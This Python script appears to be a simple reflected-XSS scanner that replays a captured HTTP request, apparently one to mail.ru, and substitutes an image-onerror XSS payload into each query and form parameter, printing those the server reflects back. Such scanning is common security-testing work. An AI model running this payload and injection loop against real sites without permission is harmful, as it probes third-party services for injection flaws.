from http.server import BaseHTTPRequestHandler
import http
from urllib.parse import urlparse
from urllib.parse import urlencode
from urllib.parse import parse_qs
from urllib.parse import unquote
import socket, ssl, pprint
from io import BytesIO

XSS = "'\"><img src=\"\" onerror=alert(\"\")>"
FILE_PATH = "/Users/aleks/Desktop/myproxy/requests/GETmail.ruHTTP1.1Mon Mar  8 18:20:43 2021\n328c57a181a40a1feb8f0135572a05791d54bb83756fadc407523c6a0f654632"

def make_https_request(host, data):
    port = 443
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        ssl_sock = ssl.wrap_socket(s)
        ssl_sock.connect((host, port))
        ssl_sock.sendall(data.encode())

        data = ssl_sock.recv(1024)

    return data.decode()


def make_http_request(host, data):
    port = 80
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        ssl_sock = s
        ssl_sock.connect((host, port))
        ssl_sock.sendall(data.encode())
        data = ssl_sock.recv(1024)

    return data.decode()


def prepare_query(query_array):
    for key in query_array.keys():
        query_array[key] = query_array[key][0]


def generate_xss_dict(query_array):
    for key in query_array.keys():
        old_value = query_array[key] 
        query_array[key] = XSS
        yield dict(query_array)
        query_array[key] = old_value


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message


request_str = ""  # we don't really need this because it's python but ...
with open(FILE_PATH, "r") as f:
    request_lines = f.readlines()
    request_str = "".join(request_lines)


request = HTTPRequest(request_str.encode())
host = request.headers["Host"]
parsed_url = urlparse(request.path)
parsed_query = parse_qs(parsed_url.query)

print(make_https_request(host, request_str))

if parsed_query:
    prepare_query(parsed_query)
    for i in generate_xss_dict(parsed_query):
        query_string = urlencode(i)
        new_request = request_str.replace(parsed_url.query, unquote(query_string))
        response = make_https_request(host, new_request)
        if response.find(XSS) != -1:
            print(i)

    print(parsed_query)


if "Content-Type" in request.headers.keys() and \
            request.headers["Content-Type"] == "application/x-www-form-urlencoded":
    pattern = "\n\n"
    pos = request_str.find(pattern)
    request_body = request_str[pos+len(pattern):]
    parsed_body_parameters = parse_qs(request_body)
    prepare_query(parsed_body_parameters)

    if parsed_body_parameters:
        for i in generate_xss_dict(parsed_body_parameters):
            query_string = urlencode(i)
            new_request = request_str.replace(
                request_body, 
                unquote(query_string)
            )
            response = make_https_request(host, new_request)
            if response.find(XSS) != -1:
                print(i)

    print(parsed_body_parameters)

print(request.headers["Host"])

